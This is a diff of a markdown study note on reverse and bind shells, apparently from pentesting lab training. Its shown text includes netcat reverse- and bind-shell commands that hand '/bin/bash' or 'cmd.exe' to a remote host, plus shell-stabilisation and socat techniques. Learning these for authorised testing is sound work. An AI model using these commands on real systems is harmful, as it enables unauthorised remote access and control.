@@ -1,25 +1,25 @@
-## Repository on Shells
+# Repository on Shells
 * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 * [SecLists](https://github.com/danielmiessler/SecLists)
 * **Kali Linux** -> `/usr/share/webshells`
 * **My Parrot OS** -> `/usr/share/wordlists/SecLists/Web-Shells`
 
-## Tools
+# Tools
 * Netcat
 * Socat
 * Metasploit Multihandler
 * Msfvenom
 
-## Types of Shells
+# Types of Shells
 * Reverse Shell
 * Bind Shell
 
-### Netcat Shells 101
+## Netcat Shells 101
 
 Netcat, the Swiss Army knife of pentesting, is crucial for networking tasks. Let's delve into shells:
 
-#### Reverse Shells
+### Reverse Shells
 
 Setting up a netcat listener on Linux is as easy as:
 
@@ -44,7 +44,7 @@ Choose ports wisely; sudo needed for < 1024. Common choices: 80, 443, or 53.
 
 Connect back with payloads based on the target environment. Check the example in the previous task for a connection demonstration.
 
-#### Bind Shells
+### Bind Shells
 
 For bind shells, assume a waiting listener on the target:
 
@@ -54,15 +54,15 @@ nc <target-ip> <chosen-port>
 
 Make an outbound connection to the target on your chosen port. Task 8 will cover creating a listener for bind shells. The key here is understanding how to connect to a listening port using netcat. 🚀
 
-# Illustrating Shells using NetCat
+### Illustrating Shells using NetCat
 
 ![bindreverse-removebg-preview](https://github.com/PranjalBasak/Documentation/assets/66166653/115194d8-e7a9-425e-a1fc-fe555c16b0b4)
 
-### Stabilizing Netcat Shells on Linux
+## Stabilizing Netcat Shells on Linux
 
 So, you've got a Netcat shell, but it's a bit wonky. Here are three techniques to make it more stable on Linux:
 
-#### Technique 1: Python Magic
+### Technique 1: Python Magic
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -73,7 +73,7 @@ stty raw -echo; fg
 
 Backgrounding the shell and foregrounding it again improves functionality. If the shell dies, type `reset` to fix visibility issues.
 
-#### Technique 2: rlwrap
+### Technique 2: rlwrap
 
 Install rlwrap with `sudo apt install rlwrap` and use it with Netcat:
 
@@ -83,7 +83,7 @@ rlwrap nc -lvnp <port>
 
 Provides history, tab completion, and arrow keys. Handy for stabilizing Windows shells too.
 
-#### Technique 3: Socat Stepping Stone
+### Technique 3: Socat Stepping Stone
 
 For Linux targets, use Socat for a more stable shell:
 
@@ -100,8 +100,9 @@ stty rows <number> && stty cols <number>
 
 Adjusting terminal size helps programs like text editors work correctly. Choose the technique that fits your scenario! 🚀
 
-## Reverse Shell
-### On the attacking machine
+## Quick Summary
+### Reverse Shell
+#### On the attacking machine
 ```bash
 sudo nc -lvnp 443
 ```
@@ -111,12 +112,12 @@ sudo nc -lvnp 443
 nc <LOCAL-IP> <PORT> -e /bin/bash
 ```
 
-## Bind Shell
-### On the target
+### Bind Shell
+#### On the target
 ```bash
 nc -lvnp <port> -e "cmd.exe"
 ```
-### On the attacking machine
+#### On the attacking machine
 ```bash
 nc MACHINE_IP <port>
 ```
